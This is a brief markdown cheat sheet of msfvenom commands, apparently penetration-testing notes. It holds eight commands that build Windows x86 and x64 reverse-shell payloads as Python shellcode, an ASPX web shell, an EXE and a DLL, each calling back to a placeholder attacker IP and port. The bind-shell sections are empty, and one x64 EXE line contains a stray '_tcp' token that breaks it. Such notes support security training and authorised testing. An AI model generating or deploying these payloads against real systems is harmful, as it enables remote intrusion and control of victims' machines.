# Msfvenom

## Windows payloads

### x86

#### Reverse shell

```bash
# Python - variable $shell - bad chars
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=<LOCAL_PORT> -b '\x00\x09\x0a' -f python -v shell

# Aspx
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=<LOCAL_PORT> -f aspx -o aspxshell.aspx

# Exe
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=<LOCAL_PORT> -f exe -o revshell.exe

# Dll
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=<LOCAL_PORT> -f dll -o revshell.dll
```

#### Bind

```bash
TBD
```

### x64

#### Reverse shell

```bash
# Python - variable $shell - bad chars
msfvenom -a x64 -p windows/x64/shell_reverse_tcp  LHOST=<KALI_IP> LPORT=<LOCAL_PORT> -b '\x00\x09\x0a' -f python -v shell

# Aspx
msfvenom -a x64 -p windows/x64/shell_reverse_tcp  LHOST=<KALI_IP> LPORT=<LOCAL_PORT> -f aspx -o aspxshell.aspx

# Exe
msfvenom -a x64 -p windows/x64/shell_reverse_tcp _tcp LHOST=<KALI_IP> LPORT=<LOCAL_PORT> -f exe -o revshell.exe

# Dll
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=<LOCAL_PORT> -f dll -o revshell.dll
```

#### Bind

```bash
TBD
```

## Links

- [HackTricks - MSFVenom](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom)
- [infinitelogins - MSFVenom](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
